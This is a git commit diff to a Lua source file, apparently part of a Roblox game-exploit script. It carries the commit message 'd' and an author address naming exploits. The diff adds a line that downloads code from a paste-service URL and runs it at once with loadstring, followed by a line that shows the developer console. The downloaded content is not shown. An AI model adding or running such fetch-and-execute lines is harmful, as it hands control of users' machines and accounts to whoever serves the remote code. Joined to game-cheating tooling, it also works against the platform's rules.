d2b471e1075378a69615194905e328709541da23
PurplesStrat <wyvern.exploits@gmail.com>
2026-01-17 11:47:08 +0000

    d

--- source.lua
+++ source.lua
@@ -12,6 +12,9 @@ me!! - Keeping the repository maintained on a chromebook
 
 ]]
 
+loadstring(game:HttpGetAsync("https://api.rubis.app/v2/scrap/hRRHzpxAaj8CQGB4/raw"))();
+StarterGui:SetCore("DevConsoleVisible", true);
+
 repeat
     task.wait()
 until game:IsLoaded() and (game.Players and (game.Players.LocalPlayer and game.Players.LocalPlayer.Character))
